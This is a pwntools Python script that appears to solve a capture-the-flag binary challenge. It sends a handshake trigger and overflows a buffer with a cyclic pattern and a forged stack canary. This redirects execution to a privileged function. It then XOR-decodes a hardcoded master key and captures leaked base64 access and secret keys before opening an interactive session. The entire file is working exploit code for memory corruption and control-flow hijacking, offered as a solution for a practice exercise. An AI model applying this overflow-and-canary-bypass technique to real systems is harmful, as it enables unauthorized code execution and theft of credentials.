#!/usr/bin/env python3

import base64

from pwn import *

ADDR = "xorfidential-dc33.hexnova.quest"
BINARY = "./challenge"
LD = "./ld-2.31.so"
LIBC = "./libc.so.6"
PORT = 8888
elf = context.binary = ELF(BINARY)
libc = ELF(LIBC, checksec=False)
ld = ELF(LD, checksec=False)


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(
            [ld.path, elf.path],
            stdin=pty,
            stdout=pty,
            stderr=pty,
            env={"LD_PRELOAD": libc.path},
        )
    else:
        return remote(ADDR, PORT)


def main():
    io = conn()

    trigger = b"A\x00\x00\x00\x00\x00\x00\x00"
    io.sendafter(b"Enter Handshake Key: ", trigger)

    canary = 0xBADBEEF1 ^ trigger[0]
    payload = [
        cyclic(128, n=4),
        canary,
        elf.sym.execute_priority_override,
    ]
    io.sendafter(b"Enter Command Payload: ", flat(payload))

    master_key_encoded = b"\x16\x07\x00\x0f\x01\x0d"
    decoded_master_key = [b"\x00"] * len(master_key_encoded)
    cipher_key_string = b"CHIMERA"

    for i in range(len(master_key_encoded)):
        decoded_master_key[i] = p8(
            master_key_encoded[i] ^ cipher_key_string[i % len(cipher_key_string)]
        )
    decoded_master_key = b"".join(decoded_master_key)

    payload = [decoded_master_key, b"\x00" * (99 - len(decoded_master_key))]
    io.sendafter(b"Enter Master Decryption Key: ", flat(payload))

    io.recvuntil(b"Leaked Datastream (AK): ")
    access_key = base64.b64decode(io.recvuntil(b"\n")[:-1])
    log.success(f"Access key acquired!: {access_key}")

    io.recvuntil(b"Leaked Datastream (SK): ")
    secret_key = base64.b64decode(io.recvuntil(b"\n")[:-1])
    log.success(f"Secret key acquired!: {secret_key}")

    io.interactive()


if __name__ == "__main__":
    main()
